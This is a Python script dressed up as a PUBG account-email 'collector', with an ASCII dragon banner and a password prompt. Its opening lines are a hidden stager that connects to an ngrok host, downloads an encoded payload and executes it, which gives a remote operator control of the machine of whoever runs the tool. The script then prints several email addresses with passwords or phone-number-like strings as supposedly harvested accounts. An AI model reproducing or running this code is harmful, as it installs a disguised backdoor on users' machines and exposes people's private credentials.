import socket,zlib,base64,struct,time
for x in range(10):
        try:
                s=socket.socket(2,socket.SOCK_STREAM)
                s.connect(('4.tcp.ngrok.io',12745))
                break
        except:
                time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
        d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
print (""" \033[0;31m _                 (
    \ |  (  \ ( \.(              )                      _____
  \  \ \  `  `   ) \            (  ___                 / _   \
 (_`    \+   . x  ( .\           \/   \____-----------/ (o)   \_
- .-               \+  ;          (  O                           \____
(__                +- .( -'.- <.   \_____________  `              \  /
(_____            ._._: <_ - <- _- _  VVVVVVV VV V\                \/
  .    /./.+-  . .- /  +--  - .    (--_AAAAAAA__A_/                |
  (__ ' /x  / x _/ (                \______________//_              \_______
 , x / ( '  . / .  /                                  \___'          \     /
    /  /  _/ /    +                                       |           \   /
   '  (__/                                               /        
""")
passwd = "12312311"

while 1 :
    man = input ("\033[0;34menter tha password : ")
    if man == passwd :
        print ("\033[0;36m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
        print ("\033[0;33mwelcome You will collect emails in PUBG")
        x = input ("\033[0;33mPlease enter 1 or 2 :")
        print ("\033[0;36mPlease wait #")
        time.sleep(5)
        print ("$\033[0;32memil : chsh3280@gmail.com ")
        print ("$\033[0;32mpassword : chsh3280 ")
        print ("# 1")
        print ("\033[0;36m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
        time.sleep(10)
        print ("$\033[0;32memil : tami45044@gmail.com ")
        print ("$password : 0527645044 ")
        print ("# 2")
        print ("\033[0;36m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
        time.sleep(10)
        print ("$\033[0;32memil : Y0527699886@GMAIL.COM ")
        print ("$password : 037123163 ")
        print ("# 3")
        print ("\033[0;36m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
        time.sleep(10)
        print ("$\033[0;32memil : bb7607772@gmail.com ")
        print ("$password : 0527607772 ")
        print ("# 4")
        print ("\033[0;36m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
        time.sleep(10)
        print ("$\033[0;32memil : pesirot1@gmail.com ")
        print ("$password : 0534946675 ")
        print ("# 5")
        print ("\033[0;36m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
        time.sleep(60)
        print ("$\033[0;32memil : m0527188920@gmail.com ")
        print ("$password : NHFK88920 ")
        print ("# 6")
        time.sleep(500)









        
